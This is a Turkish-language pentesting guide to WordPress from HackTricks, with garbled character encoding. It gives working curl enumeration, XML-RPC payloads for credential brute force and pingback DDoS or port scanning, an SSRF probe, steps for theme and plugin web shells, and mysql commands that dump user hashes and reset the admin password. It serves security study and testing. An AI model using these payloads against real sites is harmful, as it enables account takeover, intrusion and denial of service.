# Wordpress

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturun ve **otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Temel Bilgiler

**YÃ¼klenen** dosyalar ÅŸuraya gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Temalar dosyalarÄ± /wp-content/themes/ iÃ§inde bulunabilir,** bu nedenle RCE elde etmek iÃ§in temanÄ±n bazÄ± php dosyalarÄ±nÄ± deÄŸiÅŸtirirseniz muhtemelen bu yolu kullanacaksÄ±nÄ±z. Ã–rneÄŸin: **theme twentytwelve** kullanarak **404.php** dosyasÄ±na eriÅŸebilirsiniz: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**BaÅŸka bir yararlÄ± url olabilir:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

**wp-config.php** dosyasÄ±nda veritabanÄ±nÄ±n root ÅŸifresini bulabilirsiniz.

Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress DosyalarÄ±**

* `index.php`
* `license.txt` WordPress'in kurulu sÃ¼rÃ¼mÃ¼ gibi yararlÄ± bilgiler iÃ§erir.
* `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
* GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±labilir):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` WordPress'in verilerin HTTP ile iletilmesini saÄŸlayan bir Ã¶zelliÄŸini temsil eden bir dosyadÄ±r; burada HTTP taÅŸÄ±ma mekanizmasÄ± ve XML kodlama mekanizmasÄ± olarak iÅŸlev gÃ¶rÃ¼r. Bu tÃ¼r bir iletiÅŸim, WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
* `wp-content` klasÃ¶rÃ¼, eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
* `wp-content/uploads/` Platforma yÃ¼klenen dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
* `wp-includes/` Sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
* `wp-sitemap.xml` WordPress sÃ¼rÃ¼mleri 5.5 ve Ã¼zeri iÃ§in, WordPress tÃ¼m kamuya aÃ§Ä±k gÃ¶nderiler ve kamuya aÃ§Ä±k sorgulanabilir gÃ¶nderi tÃ¼rleri ve taksonomiler ile bir harita XML dosyasÄ± oluÅŸturur.

**SonrasÄ± istismar**

* `wp-config.php` dosyasÄ±, WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in ihtiyaÃ§ duyduÄŸu bilgileri iÃ§erir; bu bilgiler arasÄ±nda veritabanÄ± adÄ±, veritabanÄ± sunucusu, kullanÄ±cÄ± adÄ± ve ÅŸifre, kimlik doÄŸrulama anahtarlarÄ± ve tuzlar ile veritabanÄ± tablo Ã¶n eki bulunur. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu etkinleÅŸtirmek iÃ§in de kullanÄ±labilir, bu da sorun gidermede yararlÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

* **YÃ¶netici**
* **EditÃ¶r**: Kendi ve diÄŸerlerinin gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
* **Yazar**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
* **KatkÄ±da Bulunan**: Kendi gÃ¶nderilerini yazar ve yÃ¶netir ancak yayÄ±nlayamaz
* **Abone**: GÃ¶nderileri tarar ve profilini dÃ¼zenler

## **Pasif SÄ±ralama**

### **WordPress sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenin**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±za bakÄ±n.

SayfanÄ±n **kaynak kodu** iÃ§inde (Ã¶rnek [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/) adresinden):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* CSS baÄŸlantÄ± dosyalarÄ±

![](<../../.gitbook/assets/image (533).png>)

* JavaScript dosyalarÄ±

### Eklentileri AlÄ±n
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### SÃ¼rÃ¼mleri genel olarak Ã§Ä±karma

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Aktif numaralandÄ±rma

### Eklentiler ve Temalar

TÃ¼m Eklentileri ve TemalarÄ± bulamayabilirsiniz. Hepsini keÅŸfetmek iÃ§in, **Eklentiler ve Temalar listesini Aktif Brute Force yapmanÄ±z** gerekecek (umarÄ±z ki bu listeleri iÃ§eren otomatik araÃ§lar var).

### KullanÄ±cÄ±lar

**ID Brute**

Bir WordPress sitesinden geÃ§erli kullanÄ±cÄ±larÄ±, kullanÄ±cÄ± ID'lerini Brute Force yaparak elde edersiniz:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
EÄŸer yanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. EÄŸer yanÄ±t **400** ise, o zaman id **geÃ§ersiz**dir.

**wp-json**

AyrÄ±ca, kullanÄ±cÄ±lar hakkÄ±nda bilgi almak iÃ§in sorgulama yapmayÄ± da deneyebilirsiniz:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
BaÅŸka bir `/wp-json/` uÃ§ noktasÄ±, kullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgileri aÃ§Ä±ÄŸa Ã§Ä±karabilir:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Not edin ki bu uÃ§ nokta yalnÄ±zca bir gÃ¶nderi yapmÄ±ÅŸ kullanÄ±cÄ±larÄ± aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. **Bu Ã¶zelliÄŸi etkinleÅŸtiren kullanÄ±cÄ±lar hakkÄ±nda yalnÄ±zca bilgi saÄŸlanacaktÄ±r**.

AyrÄ±ca **/wp-json/wp/v2/pages** IP adreslerini sÄ±zdÄ±rabilir.

#### GiriÅŸ kullanÄ±cÄ± adÄ± sayÄ±mÄ±

**`/wp-login.php`**'da giriÅŸ yaparken **mesaj** **farklÄ±dÄ±r** eÄŸer belirtilen **kullanÄ±cÄ± adÄ± mevcutsa veya deÄŸilse**.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse, kimlik bilgileri iÃ§in bir brute-force saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir veya bunu diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (Bu sÃ¼reci otomatikleÅŸtirmek iÃ§in [bunu](https://github.com/relarizky/wpxploit) kullanabilirsiniz, Ã¶rneÄŸin).

Aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in _**/xmlrpc.php**_ adresine eriÅŸmeyi deneyin ve bu isteÄŸi gÃ¶nderin:

**Kontrol Et**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Kimlik Bilgileri Kaba Kuvvet**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** kimlik bilgilerini kaba kuvvetle kÄ±rmak iÃ§in kullanÄ±labilecek bazÄ± yÃ¶ntemlerdir. EÄŸer bunlardan herhangi birini bulursanÄ±z, ÅŸÃ¶yle bir ÅŸey gÃ¶nderebilirsiniz:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Mesaj _"GeÃ§ersiz kullanÄ±cÄ± adÄ± veya ÅŸifre"_ 200 kodlu bir yanÄ±t iÃ§inde, kimlik bilgileri geÃ§erli deÄŸilse gÃ¶rÃ¼nmelidir.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
AyrÄ±ca, aynÄ± istekte birkaÃ§ kimlik bilgisi denemek iÃ§in **`system.multicall`** kullanarak kimlik bilgilerini zorlamak iÃ§in **daha hÄ±zlÄ± bir yol** vardÄ±r:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA'yÄ± Atlatma**

Bu yÃ¶ntem programlar iÃ§in tasarlanmÄ±ÅŸtÄ±r ve insanlar iÃ§in deÄŸil, ayrÄ±ca eski olduÄŸu iÃ§in 2FA'yÄ± desteklemez. Yani, geÃ§erli kimlik bilgilerine sahipseniz ancak ana giriÅŸ 2FA ile korunuyorsa, **bu kimlik bilgileriyle 2FA'yÄ± atlayarak giriÅŸ yapmak iÃ§in xmlrpc.php'yi kÃ¶tÃ¼ye kullanabilirsiniz**. Konsoldan yapabileceÄŸiniz tÃ¼m eylemleri gerÃ§ekleÅŸtiremeyeceÄŸinizi unutmayÄ±n, ancak Ippsec'in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s) aÃ§Ä±klamasÄ±nda olduÄŸu gibi RCE'ye ulaÅŸmanÄ±z hala mÃ¼mkÃ¼n olabilir.

**DDoS veya port taramasÄ±**

EÄŸer listede _**pingback.ping**_ yÃ¶ntemini bulursanÄ±z, Wordpress'in herhangi bir host/port'a keyfi bir istek gÃ¶ndermesini saÄŸlayabilirsiniz.\
Bu, **binlerce** Wordpress **sitesinin** bir **konuma** **eriÅŸmesi** iÃ§in istek yapmasÄ± (yani o konumda bir **DDoS** oluÅŸturulmasÄ±) veya **Wordpress**'in bazÄ± iÃ§ **aÄŸlarÄ±** **taramasÄ±nÄ±** saÄŸlamak iÃ§in kullanÄ±labilir (herhangi bir portu belirtebilirsiniz).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan **bÃ¼yÃ¼k** (17) ise, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Bu yÃ¶ntemi kÃ¶tÃ¼ye kullanarak DDoS oluÅŸturmayÄ± Ã¶ÄŸrenmek iÃ§in Ã¶nceki bÃ¶lÃ¼mdeki **`system.multicall`** kullanÄ±mÄ±na bakÄ±n.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶kÃ¼nde bulunur: **`/wp-cron.php`**\
Bu dosya **eriÅŸildiÄŸinde** "aÄŸÄ±r" bir MySQL **sorgusu** gerÃ§ekleÅŸtirilir, bu nedenle **saldÄ±rganlar** tarafÄ±ndan bir **DoS** **oluÅŸturmak** iÃ§in kullanÄ±labilir.\
AyrÄ±ca, varsayÄ±lan olarak, `wp-cron.php` her sayfa yÃ¼klemesinde (bir istemci herhangi bir Wordpress sayfasÄ±nÄ± talep ettiÄŸinde) Ã§aÄŸrÄ±lÄ±r, bu da yÃ¼ksek trafikli sitelerde sorunlara neden olabilir (DoS).

Wp-Cron'un devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± ve gerekli eylemleri dÃ¼zenli aralÄ±klarla gerÃ§ekleÅŸtiren gerÃ§ek bir cronjob'un host iÃ§inde oluÅŸturulmasÄ± Ã¶nerilir (sorun yaratmadan).

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ adresine eriÅŸmeyi deneyin ve Wordpress sitesi size bir istek yapabilir.

Bu Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nda gelen yanÄ±t:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Bu araÃ§ **methodName: pingback.ping** ve **/wp-json/oembed/1.0/proxy** yolunu kontrol eder ve eÄŸer mevcutsa, bunlarÄ± istismar etmeye Ã§alÄ±ÅŸÄ±r.

### Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Bir biti geÃ§ersiz kÄ±larak eriÅŸim elde etme

GerÃ§ek bir saldÄ±rÄ±dan Ã§ok bir merak. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndan 1 biti deÄŸiÅŸtirebilirsiniz. BÃ¶ylece `/var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumunu NOT (`!`) iÅŸlemini NOP yapmak iÃ§in deÄŸiÅŸtirebilirsiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadan bir php dosyasÄ±nÄ± deÄŸiÅŸtirme (admin kimlik bilgileri gerekli)**

GÃ¶rÃ¼nÃ¼m â†’ Tema DÃ¼zenleyici â†’ 404 Åablonu (saÄŸda)

Bir php shell iÃ§in iÃ§eriÄŸi deÄŸiÅŸtirin:

![](<../../.gitbook/assets/image (384).png>)

Bu gÃ¼ncellenmiÅŸ sayfaya nasÄ±l eriÅŸeceÄŸinizi internette arayÄ±n. Bu durumda buraya eriÅŸmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Åunu kullanabilirsiniz:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Eklenti RCE

### PHP eklentisi

Eklenti olarak .php dosyalarÄ± yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin, php arka kapÄ±nÄ±zÄ± oluÅŸturun:

![](<../../.gitbook/assets/image (183).png>)

Sonra yeni bir eklenti ekleyin:

![](<../../.gitbook/assets/image (722).png>)

Eklentiyi yÃ¼kleyin ve Åimdi YÃ¼kle'ye basÄ±n:

![](<../../.gitbook/assets/image (249).png>)

Devam'a tÄ±klayÄ±n:

![](<../../.gitbook/assets/image (70).png>)

Muhtemelen bu gÃ¶rÃ¼nÃ¼ÅŸte hiÃ§bir ÅŸey yapmayacak, ancak Medya'ya giderseniz, yÃ¼klediÄŸiniz shell'i gÃ¶receksiniz:

![](<../../.gitbook/assets/image (462).png>)

EriÅŸin ve ters shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'yi gÃ¶receksiniz:

![](<../../.gitbook/assets/image (1006).png>)

### KÃ¶tÃ¼ niyetli eklentiyi yÃ¼kleme ve etkinleÅŸtirme

Bu yÃ¶ntem, bilinen bir zafiyete sahip kÃ¶tÃ¼ niyetli bir eklentinin yÃ¼klenmesini iÃ§erir ve bir web shell elde etmek iÃ§in istismar edilebilir. Bu sÃ¼reÃ§, WordPress kontrol paneli aracÄ±lÄ±ÄŸÄ±yla aÅŸaÄŸÄ±daki gibi gerÃ§ekleÅŸtirilir:

1. **Eklenti Edinme**: Eklenti, Exploit DB gibi bir kaynaktan [**buradan**](https://www.exploit-db.com/exploits/36374) edinilir.
2. **Eklenti YÃ¼kleme**:
* WordPress kontrol paneline gidin, ardÄ±ndan `Kontrol Paneli > Eklentiler > Eklenti YÃ¼kle` seÃ§eneÄŸine gidin.
* Ä°ndirilen eklentinin zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Eklenti EtkinleÅŸtirme**: Eklenti baÅŸarÄ±yla yÃ¼klendikten sonra, kontrol paneli aracÄ±lÄ±ÄŸÄ±yla etkinleÅŸtirilmelidir.
4. **Ä°stismar**:
* "reflex-gallery" eklentisi yÃ¼klendiÄŸinde ve etkinleÅŸtirildiÄŸinde, bilinen bir zafiyet olduÄŸu iÃ§in istismar edilebilir.
* Metasploit Ã§erÃ§evesi, bu zafiyet iÃ§in bir istismar saÄŸlar. Uygun modÃ¼lÃ¼ yÃ¼kleyerek ve belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak, yetkisiz eriÅŸim saÄŸlayan bir meterpreter oturumu oluÅŸturulabilir.
* Bunun, bir WordPress sitesini istismar etmenin birÃ§ok yÃ¶nteminden sadece biri olduÄŸu belirtilmektedir.

Ä°Ã§erik, eklentiyi yÃ¼kleme ve etkinleÅŸtirme adÄ±mlarÄ±nÄ± gÃ¶steren gÃ¶rsel yardÄ±mlar iÃ§ermektedir. Ancak, bu ÅŸekilde zafiyetleri istismar etmenin yasal izin olmadan yasadÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ± olduÄŸunu belirtmek Ã¶nemlidir. Bu bilgi, sorumlu bir ÅŸekilde ve yalnÄ±zca yasal bir baÄŸlamda, Ã¶rneÄŸin aÃ§Ä±k izinle penetrasyon testi iÃ§in kullanÄ±lmalÄ±dÄ±r.

**Daha ayrÄ±ntÄ±lÄ± adÄ±mlar iÃ§in kontrol edin:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS'den RCE'ye

* [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_, **Cross-Site Scripting (XSS)** zafiyetini **Remote Code Execution (RCE)** veya diÄŸer kritik zafiyetlere yÃ¼kseltmek iÃ§in tasarlanmÄ±ÅŸ bir betiktir. Daha fazla bilgi iÃ§in [**bu gÃ¶nderiye**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) bakÄ±n. **WordPress SÃ¼rÃ¼mleri 6.X.X, 5.X.X ve 4.X.X iÃ§in destek saÄŸlar ve ÅŸunlarÄ± yapmanÄ±za olanak tanÄ±r:**
* _**Yetki YÃ¼kseltme:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
* _**(RCE) Ã–zel Eklenti (arka kapÄ±) YÃ¼kleme:**_ Ã–zel eklentinizi (arka kapÄ±) WordPress'e yÃ¼kleyin.
* _**(RCE) YerleÅŸik Eklenti DÃ¼zenleme:**_ WordPress'teki YerleÅŸik Eklentileri dÃ¼zenleyin.
* _**(RCE) YerleÅŸik Tema DÃ¼zenleme:**_ WordPress'teki YerleÅŸik TemalarÄ± dÃ¼zenleyin.
* _**(Ã–zel) Ã–zel Ä°stismarlar:**_ ÃœÃ§Ã¼ncÃ¼ Taraf WordPress Eklentileri/Tema iÃ§in Ã–zel Ä°stismarlar.

## Ä°stismar SonrasÄ±

KullanÄ±cÄ± adlarÄ±nÄ± ve ÅŸifreleri Ã§Ä±karÄ±n:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin ÅŸifresini deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Eklentileri Pentest

### SaldÄ±rÄ± YÃ¼zeyi

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini bilmek, iÅŸlevselliÄŸindeki zayÄ±flÄ±klarÄ± bulmak iÃ§in anahtardÄ±r. Bir eklentinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini aÅŸaÄŸÄ±daki madde iÅŸaretlerinde ve [**bu blog yazÄ±sÄ±nda**](https://nowotarski.info/wordpress-nonce-authorization/) bazÄ± zayÄ±f eklenti Ã¶rneklerinde bulabilirsiniz.

* **`wp_ajax`**&#x20;

Bir eklentinin iÅŸlevleri kullanÄ±cÄ±lara aÃ§Ä±ÄŸa Ã§Ä±karmanÄ±n yollarÄ±ndan biri AJAX iÅŸleyicileri aracÄ±lÄ±ÄŸÄ±yladÄ±r. Bunlar, mantÄ±k, yetkilendirme veya kimlik doÄŸrulama hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu iÅŸlevlerin genellikle hem kimlik doÄŸrulama hem de yetkilendirmeyi, **herhangi bir Wordpress Ã¶rneÄŸinde kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ bir kullanÄ±cÄ±nÄ±n sahip olabileceÄŸi** bir Wordpress nonce'un varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± sÄ±k rastlanan bir durumdur (rolÃ¼nden baÄŸÄ±msÄ±z olarak).

Bir eklentide bir iÅŸlevi aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in kullanÄ±labilecek iÅŸlevler ÅŸunlardÄ±r:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ±, uÃ§ noktanÄ±n herhangi bir kullanÄ±cÄ± (hatta kimliÄŸi doÄŸrulanmamÄ±ÅŸ olanlar) tarafÄ±ndan eriÅŸilebilir olmasÄ±nÄ± saÄŸlar.**

{% hint style="danger" %}
AyrÄ±ca, eÄŸer fonksiyon sadece `wp_verify_nonce` fonksiyonu ile kullanÄ±cÄ±nÄ±n yetkilendirmesini kontrol ediyorsa, bu fonksiyon genellikle kullanÄ±cÄ±nÄ±n giriÅŸ yapÄ±p yapmadÄ±ÄŸÄ±nÄ± kontrol eder, kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ kontrol etmez. Bu nedenle, dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± eylemlere eriÅŸim saÄŸlayabilir.
{% endhint %}

* **REST API**

`register_rest_route` fonksiyonunu kullanarak wordpress'ten fonksiyonlarÄ± aÃ§Ä±ÄŸa Ã§Ä±karmak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback`, belirli bir kullanÄ±cÄ±nÄ±n API yÃ¶ntemini Ã§aÄŸÄ±rma yetkisine sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir iÅŸlevin geri Ã§aÄŸrÄ±lmasÄ±dÄ±r.

**EÄŸer yerleÅŸik `__return_true` iÅŸlevi kullanÄ±lÄ±yorsa, kullanÄ±cÄ± izinleri kontrolÃ¼ atlanacaktÄ±r.**

* **PHP dosyasÄ±na doÄŸrudan eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve eklentiler iÃ§indeki dosyalar web Ã¼zerinden doÄŸrudan eriÅŸilebilir. Bu nedenle, bir eklenti, dosyaya eriÅŸim saÄŸlanarak tetiklenen herhangi bir savunmasÄ±z iÅŸlevsellik sunuyorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan istismar edilebilir.

## WordPress KorumasÄ±

### DÃ¼zenli GÃ¼ncellemeler

WordPress, eklentiler ve temalarÄ±n gÃ¼ncel olduÄŸundan emin olun. AyrÄ±ca, wp-config.php dosyasÄ±nda otomatik gÃ¼ncellemenin etkin olduÄŸunu doÄŸrulayÄ±n:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, **sadece gÃ¼venilir WordPress eklentileri ve temalarÄ± yÃ¼kleyin**.

### GÃ¼venlik Eklentileri

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

